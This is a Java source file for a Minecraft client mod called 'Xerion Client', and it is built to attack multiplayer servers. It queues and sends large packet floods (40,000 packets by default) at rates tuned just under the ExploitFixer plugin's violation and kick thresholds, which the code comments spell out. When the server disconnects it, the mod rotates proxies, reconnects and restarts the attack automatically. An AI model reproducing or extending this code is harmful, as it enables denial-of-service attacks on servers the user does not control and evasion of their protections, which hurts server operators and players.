package com.professor.client;

import com.professor.client.exploit.ExploitLogger;
import com.professor.client.gui.*;
import com.professor.client.proxy.ProxyManager;
import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientLifecycleEvents;
import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents;
import net.fabricmc.fabric.api.client.keybinding.v1.KeyBindingHelper;
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents;
import net.fabricmc.fabric.api.client.screen.v1.ScreenEvents;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.gui.screen.ConnectScreen;
import net.minecraft.client.gui.screen.TitleScreen;
import net.minecraft.client.network.ServerAddress;
import net.minecraft.client.network.ServerInfo;
import net.minecraft.client.option.KeyBinding;
import net.minecraft.client.sound.PositionedSoundInstance;
import net.minecraft.client.util.InputUtil;
import net.minecraft.network.packet.Packet;
import net.minecraft.util.Identifier;
import org.lwjgl.glfw.GLFW;

import java.util.concurrent.ConcurrentLinkedQueue;

public class ProfessorClientMod implements ClientModInitializer {

    public static KeyBinding openGuiKey;
    public static final String MOD_ID    = "professorclient";
    public static final String CLIENT_NAME = "Xerion Client";

    // ── Last server info (needed for auto-reconnect) ──────────────────────
    public static volatile String lastServerHost = "";
    public static volatile int    lastServerPort = 25565;
    public static volatile String lastServerName = "Server";

    // ── Reconnect state ───────────────────────────────────────────────────
    private static volatile boolean pendingReconnect = false;
    private static volatile int     reconnectDelay   = 0;
    private static volatile int     reconnectCount   = 0;
    public  static volatile boolean attackActive     = false;
    public  static volatile int     attackN          = 40000;
    public  static volatile int     attackBypass     = 10; // EXFIX default

    // ── Packet queue (ExploitFixer bypass) ───────────────────────────────
    // TeleportConfirm VL=0.01 → 2000/sec = exactly EF reduce rate → net 0 VL forever
    // Movement VL=0.2 → cap at 80/sec = 16 VL/sec < 20 reduce → safe
    // EF cancel=25VL · kick=100VL · PPS-hard=4096/sec
    public static final ConcurrentLinkedQueue<Packet<?>> PACKET_QUEUE = new ConcurrentLinkedQueue<>();
    public static volatile int PACKETS_PER_TICK = 100; // default 2000/sec EXFIX mode

    // ── Swing rate-limiter (EF: 100ms cooldown) ───────────────────────────
    private static long lastSwingMs = 0;
    public  static volatile int SWING_COOLDOWN_MS = 105;

    @Override
    public void onInitializeClient() {

        // ── Splash screen on first launch ─────────────────────────────────
        ClientLifecycleEvents.CLIENT_STARTED.register(client ->
            client.execute(() -> client.setScreen(new ProfessorSplashScreen())));

        // ── M → open Xerion GUI ───────────────────────────────────────────
        openGuiKey = KeyBindingHelper.registerKeyBinding(new KeyBinding(
            "key.professorclient.open_gui",
            InputUtil.Type.KEYSYM,
            GLFW.GLFW_KEY_M,
            "category.professorclient.general"
        ));

        // ── Tick loop ─────────────────────────────────────────────────────
        ClientTickEvents.END_CLIENT_TICK.register(client -> {

            // Open GUI (M key)
            while (openGuiKey.wasPressed()) {
                if (client.player != null) {
                    playSound(client, "hello_friend");
                    client.setScreen(new ProfessorScreen());
                }
            }

            // Drain packet queue at controlled rate (EF bypass)
            if (!PACKET_QUEUE.isEmpty() && client.getNetworkHandler() != null) {
                int sent = 0;
                while (!PACKET_QUEUE.isEmpty() && sent < PACKETS_PER_TICK) {
                    Packet<?> pkt = PACKET_QUEUE.poll();
                    if (pkt != null) {
                        try { client.getNetworkHandler().sendPacket(pkt); }
                        catch (Exception ignored) {}
                        sent++;
                    }
                }
            }

            // Store last server address (needed for proxy reconnect)
            if (client.getCurrentServerEntry() != null) {
                ServerInfo si = client.getCurrentServerEntry();
                lastServerName = si.name;
                ServerAddress sa = ServerAddress.parse(si.address);
                lastServerHost = sa.getAddress();
                lastServerPort = sa.getPort();
            }

            // Pending reconnect countdown
            if (pendingReconnect) {
                if (--reconnectDelay <= 0) {
                    pendingReconnect = false;
                    doReconnect(client);
                }
            }
        });

        // ── Disconnect → auto-rotate proxy & reconnect ────────────────────
        ClientPlayConnectionEvents.DISCONNECT.register((handler, client) -> {
            PACKET_QUEUE.clear();
            ExploitLogger.warn("DISCONNECT", "Disconnected from "+lastServerHost+":"+lastServerPort);

            if (!ProxyManager.shouldAlwaysRotate() || lastServerHost.isEmpty()) return;

            ProxyManager.ProxyEntry next = ProxyManager.rotate();
            reconnectCount++;
            pendingReconnect = true;
            reconnectDelay   = 30; // 1.5 seconds

            ExploitLogger.info("PROXY", "Rotating to #"+ProxyManager.getCurrent()+
                ": "+(next!=null?next.host():"direct")+
                " | Reconnect #"+reconnectCount);
        });

        // ── Screen events: replace TitleScreen + restart attack ───────────
        ScreenEvents.AFTER_INIT.register((client, screen, w, h) -> {

            // Replace vanilla TitleScreen with Xerion's custom one
            if (screen instanceof TitleScreen && !(screen instanceof XerionTitleScreen)) {
                client.execute(() -> {
                    playOnTitleIfNeeded(client);
                    client.setScreen(new XerionTitleScreen());
                });
                return;
            }

            // After reconnect: restart attack automatically if enabled
            if (attackActive
                    && client.player != null
                    && client.getNetworkHandler() != null
                    && !(screen instanceof TitleScreen)
                    && !(screen instanceof ConnectScreen)) {
                attackActive = false;
                ProfessorScreen.scheduleAttack(attackN, attackBypass);
                ExploitLogger.info("AUTO-ATTACK","Restarted attack after reconnect ("+attackN+" pkts, bypass="+attackBypass+")");
            }
        });
    }

    // ── Reconnect using stored server + current proxy ─────────────────────
    private static void doReconnect(MinecraftClient client) {
        if (lastServerHost.isEmpty()) return;
        try {
            ServerAddress addr = new ServerAddress(lastServerHost, lastServerPort);
            ServerInfo info = new ServerInfo(lastServerName,
                lastServerHost+":"+lastServerPort, ServerInfo.ServerType.OTHER);
            ConnectScreen.connect(new XerionTitleScreen(), client, addr, info, false, null);
            ExploitLogger.info("RECONNECT","Connecting to "+lastServerHost+":"+lastServerPort+
                " via proxy #"+ProxyManager.getCurrent());
        } catch (Exception e) {
            ExploitLogger.error("RECONNECT","Failed: "+e.getMessage());
        }
    }

    // ── Sound helpers ─────────────────────────────────────────────────────
    public static void playSound(MinecraftClient client, String name) {
        try {
            var reg = net.minecraft.registry.Registries.SOUND_EVENT;
            var id  = Identifier.of(MOD_ID, name);
            if (reg.containsId(id))
                client.getSoundManager().play(PositionedSoundInstance.master(reg.get(id), 1f, 1f));
        } catch (Exception ignored) {}
    }

    public static void playClickSound(MinecraftClient client) {
        try {
            var reg = net.minecraft.registry.Registries.SOUND_EVENT;
            var id  = Identifier.of("minecraft", "block.note_block.pling");
            if (reg.containsId(id))
                client.getSoundManager().play(PositionedSoundInstance.master(reg.get(id), 1.8f, 0.45f));
        } catch (Exception ignored) {}
    }

    private static void playOnTitleIfNeeded(MinecraftClient client) {
        try { ProfessorMusicManager.playOnTitleScreen(client); } catch (Exception ignored) {}
    }

    // ── Queue / swing helpers ─────────────────────────────────────────────
    public static void queuePacket(Packet<?> pkt) { PACKET_QUEUE.offer(pkt); }
    public static void clearQueue()               { PACKET_QUEUE.clear(); }

    public static boolean canSwing() {
        long now = System.currentTimeMillis();
        if (now - lastSwingMs >= SWING_COOLDOWN_MS) { lastSwingMs = now; return true; }
        return false;
    }

    public static int getReconnectCount() { return reconnectCount; }
}
